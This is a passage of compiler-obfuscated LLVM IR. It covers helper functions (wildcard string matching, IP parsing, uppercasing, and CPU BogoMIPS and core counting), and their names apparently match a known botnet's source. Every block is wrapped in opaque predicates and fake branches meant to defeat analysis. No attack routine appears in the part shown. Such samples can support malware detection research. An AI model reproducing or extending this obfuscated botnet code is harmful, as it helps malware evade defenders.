  %18 = load i32, i32* @y.28
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %16, label %86 [
    i32 0, label %25
    i32 42, label %29
    i32 63, label %69
  ]

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i8*, i8** %13, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  store i32 %28, i32* %11, align 4
  br label %156

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i32, i32* @x.27
  %31 = load i32, i32* @y.28
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  %38 = load i8*, i8** %12, align 8
  %39 = getelementptr inbounds i8, i8* %38, i64 1
  %40 = load i8*, i8** %13, align 8
  %41 = call i32 @wildString(i8* %39, i8* %40)
  %42 = icmp ne i32 %41, 0
  %43 = load i32, i32* @x.27
  %44 = load i32, i32* @y.28
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %42, label %51, label %65

; <label>:51:                                     ; preds = %originalBBpart24
  %52 = load i8*, i8** %13, align 8
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %63

; <label>:56:                                     ; preds = %51
  %57 = load i8*, i8** %12, align 8
  %58 = load i8*, i8** %13, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 1
  %60 = call i32 @wildString(i8* %57, i8* %59)
  %61 = icmp ne i32 %60, 0
  %62 = xor i1 %61, true
  br label %63

; <label>:63:                                     ; preds = %56, %51
  %64 = phi i1 [ false, %51 ], [ %62, %56 ]
  br label %65

; <label>:65:                                     ; preds = %63, %originalBBpart24
  %66 = phi i1 [ true, %originalBBpart24 ], [ %64, %63 ]
  %67 = xor i1 %66, true
  %68 = zext i1 %67 to i32
  store i32 %68, i32* %11, align 4
  br label %156

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = load i8*, i8** %13, align 8
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %82

; <label>:74:                                     ; preds = %69
  %75 = load i8*, i8** %12, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 1
  %77 = load i8*, i8** %13, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = call i32 @wildString(i8* %76, i8* %78)
  %80 = icmp ne i32 %79, 0
  %81 = xor i1 %80, true
  br label %82

; <label>:82:                                     ; preds = %74, %69
  %83 = phi i1 [ false, %69 ], [ %81, %74 ]
  %84 = xor i1 %83, true
  %85 = zext i1 %84 to i32
  store i32 %85, i32* %11, align 4
  br label %156

; <label>:86:                                     ; preds = %originalBBpart2
  %87 = load i32, i32* @x.27
  %88 = load i32, i32* @y.28
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  %95 = load i8*, i8** %12, align 8
  %96 = load i8, i8* %95, align 1
  %97 = zext i8 %96 to i32
  %98 = call i32 @toupper(i32 %97) #10
  %99 = load i8*, i8** %13, align 8
  %100 = load i8, i8* %99, align 1
  %101 = zext i8 %100 to i32
  %102 = call i32 @toupper(i32 %101) #10
  %103 = icmp eq i32 %98, %102
  %104 = load i32, i32* @x.27
  %105 = load i32, i32* @y.28
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %103, label %112, label %136

; <label>:112:                                    ; preds = %originalBBpart28
  %113 = load i32, i32* @x.27
  %114 = load i32, i32* @y.28
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %112
  %121 = load i8*, i8** %12, align 8
  %122 = getelementptr inbounds i8, i8* %121, i64 1
  %123 = load i8*, i8** %13, align 8
  %124 = getelementptr inbounds i8, i8* %123, i64 1
  %125 = call i32 @wildString(i8* %122, i8* %124)
  %126 = icmp ne i32 %125, 0
  %127 = xor i1 %126, true
  %128 = load i32, i32* @x.27
  %129 = load i32, i32* @y.28
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %136

; <label>:136:                                    ; preds = %originalBBpart212, %originalBBpart28
  %137 = phi i1 [ false, %originalBBpart28 ], [ %127, %originalBBpart212 ]
  %138 = load i32, i32* @x.27
  %139 = load i32, i32* @y.28
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %136
  %146 = xor i1 %137, true
  %147 = zext i1 %146 to i32
  store i32 %147, i32* %11, align 4
  %148 = load i32, i32* @x.27
  %149 = load i32, i32* @y.28
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart222, label %originalBB14alteredBB

originalBBpart222:                                ; preds = %originalBB14
  br label %156

; <label>:156:                                    ; preds = %originalBBpart222, %82, %65, %25
  %157 = load i32, i32* @x.27
  %158 = load i32, i32* @y.28
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %156
  %165 = load i32, i32* %11, align 4
  %166 = load i32, i32* @x.27
  %167 = load i32, i32* @y.28
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  ret i32 %165

originalBBalteredBB:                              ; preds = %originalBB, %2
  %174 = alloca i32, align 4
  %175 = alloca i8*, align 8
  %176 = alloca i8*, align 8
  store i8* %0, i8** %175, align 8
  store i8* %1, i8** %176, align 8
  %177 = load i8*, i8** %175, align 8
  %178 = load i8, i8* %177, align 1
  %179 = zext i8 %178 to i32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  %180 = load i8*, i8** %12, align 8
  %181 = getelementptr inbounds i8, i8* %180, i64 1
  %182 = load i8*, i8** %13, align 8
  %183 = call i32 @wildString(i8* %181, i8* %182)
  %184 = icmp ne i32 %183, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  %185 = load i8*, i8** %12, align 8
  %186 = load i8, i8* %185, align 1
  %187 = zext i8 %186 to i32
  %188 = call i32 @toupper(i32 %187) #10
  %189 = load i8*, i8** %13, align 8
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = call i32 @toupper(i32 %191) #10
  %193 = icmp eq i32 %188, %192
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %112
  %194 = load i8*, i8** %12, align 8
  %195 = getelementptr inbounds i8, i8* %194, i64 1
  %196 = load i8*, i8** %13, align 8
  %197 = getelementptr inbounds i8, i8* %196, i64 1
  %198 = call i32 @wildString(i8* %195, i8* %197)
  %199 = icmp ne i32 %198, 0
  %_ = sub i1 %199, true
  %gen = mul i1 %_, true
  %200 = xor i1 %199, true
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %136
  %_15 = sub i1 false, %137
  %gen16 = add i1 %_15, true
  %_17 = sub i1 false, %137
  %gen18 = add i1 %_17, true
  %_19 = sub i1 false, %137
  %gen20 = add i1 %_19, true
  %201 = xor i1 %137, true
  %202 = zext i1 %201 to i32
  store i32 %202, i32* %11, align 4
  br label %originalBB14

originalBB24alteredBB:                            ; preds = %originalBB24, %156
  %203 = load i32, i32* %11, align 4
  br label %originalBB24
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* @x.29
  %16 = load i32, i32* @y.30
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i32, i32* %3, align 4
  %24 = load i32, i32* @x.29
  %25 = load i32, i32* @y.30
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %23

originalBBalteredBB:                              ; preds = %originalBB, %14
  %32 = load i32, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %23, %1
  %4 = load i32, i32* @x.31
  %5 = load i32, i32* @y.32
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = load i8*, i8** %2, align 8
  %13 = load i8, i8* %12, align 1
  %14 = icmp ne i8 %13, 0
  %15 = load i32, i32* @x.31
  %16 = load i32, i32* @y.32
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %32

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i8*, i8** %2, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = call i32 @toupper(i32 %26) #10
  %28 = trunc i32 %27 to i8
  %29 = load i8*, i8** %2, align 8
  store i8 %28, i8* %29, align 1
  %30 = load i8*, i8** %2, align 8
  %31 = getelementptr inbounds i8, i8* %30, i32 1
  store i8* %31, i8** %2, align 8
  br label %3

; <label>:32:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %33 = load i8*, i8** %2, align 8
  %34 = load i8, i8* %33, align 1
  %35 = icmp ne i8 %34, 0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.21, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %210, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %212

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %210

; <label>:19:                                     ; preds = %13
  %20 = load i32, i32* @x.33
  %21 = load i32, i32* @y.34
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %29 = getelementptr inbounds i8, i8* %28, i64 8
  store i8* %29, i8** %6, align 8
  %30 = load i32, i32* @x.33
  %31 = load i32, i32* @y.34
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:38:                                     ; preds = %103, %originalBBpart2
  %39 = load i8*, i8** %6, align 8
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 32
  br i1 %42, label %85, label %43

; <label>:43:                                     ; preds = %38
  %44 = load i32, i32* @x.33
  %45 = load i32, i32* @y.34
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i8*, i8** %6, align 8
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 9
  %56 = load i32, i32* @x.33
  %57 = load i32, i32* @y.34
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %55, label %85, label %64

; <label>:64:                                     ; preds = %originalBBpart24
  %65 = load i32, i32* @x.33
  %66 = load i32, i32* @y.34
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %64
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 58
  %77 = load i32, i32* @x.33
  %78 = load i32, i32* @y.34
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %85

; <label>:85:                                     ; preds = %originalBBpart28, %originalBBpart24, %38
  %86 = phi i1 [ true, %originalBBpart24 ], [ true, %38 ], [ %76, %originalBBpart28 ]
  %87 = load i32, i32* @x.33
  %88 = load i32, i32* @y.34
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %85
  %95 = load i32, i32* @x.33
  %96 = load i32, i32* @y.34
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %86, label %103, label %106

; <label>:103:                                    ; preds = %originalBBpart212
  %104 = load i8*, i8** %6, align 8
  %105 = getelementptr inbounds i8, i8* %104, i32 1
  store i8* %105, i8** %6, align 8
  br label %38

; <label>:106:                                    ; preds = %originalBBpart212
  %107 = load i32, i32* @x.33
  %108 = load i32, i32* @y.34
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %106
  %115 = load i32, i32* @x.33
  %116 = load i32, i32* @y.34
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %123

; <label>:123:                                    ; preds = %175, %originalBBpart216
  %124 = load i32, i32* @x.33
  %125 = load i32, i32* @y.34
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %123
  %132 = load i8*, i8** %6, align 8
  %133 = load i8*, i8** %6, align 8
  %134 = call i64 @strlen(i8* %133) #10
  %135 = sub i64 %134, 1
  %136 = getelementptr inbounds i8, i8* %132, i64 %135
  %137 = load i8, i8* %136, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 13
  %140 = load i32, i32* @x.33
  %141 = load i32, i32* @y.34
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %139, label %173, label %148

; <label>:148:                                    ; preds = %originalBBpart220
  %149 = load i32, i32* @x.33
  %150 = load i32, i32* @y.34
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %148
  %157 = load i8*, i8** %6, align 8
  %158 = load i8*, i8** %6, align 8
  %159 = call i64 @strlen(i8* %158) #10
  %160 = sub i64 %159, 1
  %161 = getelementptr inbounds i8, i8* %157, i64 %160
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 10
  %165 = load i32, i32* @x.33
  %166 = load i32, i32* @y.34
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart234, label %originalBB22alteredBB

originalBBpart234:                                ; preds = %originalBB22
  br label %173

; <label>:173:                                    ; preds = %originalBBpart234, %originalBBpart220
  %174 = phi i1 [ true, %originalBBpart220 ], [ %164, %originalBBpart234 ]
  br i1 %174, label %175, label %181

; <label>:175:                                    ; preds = %173
  %176 = load i8*, i8** %6, align 8
  %177 = load i8*, i8** %6, align 8
  %178 = call i64 @strlen(i8* %177) #10
  %179 = sub i64 %178, 1
  %180 = getelementptr inbounds i8, i8* %176, i64 %179
  store i8 0, i8* %180, align 1
  br label %123

; <label>:181:                                    ; preds = %173
  %182 = load i8*, i8** %6, align 8
  %183 = call i8* @strchr(i8* %182, i32 46) #10
  %184 = icmp ne i8* %183, null
  br i1 %184, label %185, label %188

; <label>:185:                                    ; preds = %181
  %186 = load i8*, i8** %6, align 8
  %187 = call i8* @strchr(i8* %186, i32 46) #10
  store i8 0, i8* %187, align 1
  br label %188

; <label>:188:                                    ; preds = %185, %181
  %189 = load i32, i32* @x.33
  %190 = load i32, i32* @y.34
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %188
  %197 = load i8*, i8** %3, align 8
  %198 = load i8*, i8** %6, align 8
  %199 = call i8* @strcpy(i8* %197, i8* %198) #2
  %200 = load i32, i32* %4, align 4
  %201 = call i32 @close(i32 %200)
  store i32 0, i32* %2, align 4
  %202 = load i32, i32* @x.33
  %203 = load i32, i32* @y.34
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %215

; <label>:210:                                    ; preds = %13
  %211 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %211, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:212:                                    ; preds = %8
  %213 = load i32, i32* %4, align 4
  %214 = call i32 @close(i32 %213)
  store i32 1, i32* %2, align 4
  br label %215

; <label>:215:                                    ; preds = %212, %originalBBpart238
  %216 = load i32, i32* %2, align 4
  ret i32 %216

originalBBalteredBB:                              ; preds = %originalBB, %19
  %217 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %218 = getelementptr inbounds i8, i8* %217, i64 8
  store i8* %218, i8** %6, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %219 = load i8*, i8** %6, align 8
  %220 = load i8, i8* %219, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 9
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %64
  %223 = load i8*, i8** %6, align 8
  %224 = load i8, i8* %223, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 58
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %85
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %106
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %123
  %227 = load i8*, i8** %6, align 8
  %228 = load i8*, i8** %6, align 8
  %229 = call i64 @strlen(i8* %228) #10
  %_ = sub i64 0, %229
  %gen = add i64 %_, 1
  %230 = sub i64 %229, 1
  %231 = getelementptr inbounds i8, i8* %227, i64 %230
  %232 = load i8, i8* %231, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 13
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %148
  %235 = load i8*, i8** %6, align 8
  %236 = load i8*, i8** %6, align 8
  %237 = call i64 @strlen(i8* %236) #10
  %_23 = sub i64 0, %237
  %gen24 = add i64 %_23, 1
  %_25 = sub i64 0, %237
  %gen26 = add i64 %_25, 1
  %_27 = shl i64 %237, 1
  %_28 = shl i64 %237, 1
  %_29 = sub i64 0, %237
  %gen30 = add i64 %_29, 1
  %_31 = shl i64 %237, 1
  %_32 = shl i64 %237, 1
  %238 = sub i64 %237, 1
  %239 = getelementptr inbounds i8, i8* %235, i64 %238
  %240 = load i8, i8* %239, align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 10
  br label %originalBB22

originalBB36alteredBB:                            ; preds = %originalBB36, %188
  %243 = load i8*, i8** %3, align 8
  %244 = load i8*, i8** %6, align 8
  %245 = call i8* @strcpy(i8* %243, i8* %244) #2
  %246 = load i32, i32* %4, align 4
  %247 = call i32 @close(i32 %246)
  store i32 0, i32* %2, align 4
  br label %originalBB36
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.21, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %originalBBpart211, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %53

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %35

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @x.35
  %18 = load i32, i32* @y.36
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* %1, align 4
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* %1, align 4
  %27 = load i32, i32* @x.35
  %28 = load i32, i32* @y.36
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %35

; <label>:35:                                     ; preds = %originalBBpart2, %10
  %36 = load i32, i32* @x.35
  %37 = load i32, i32* @y.36
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %35
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
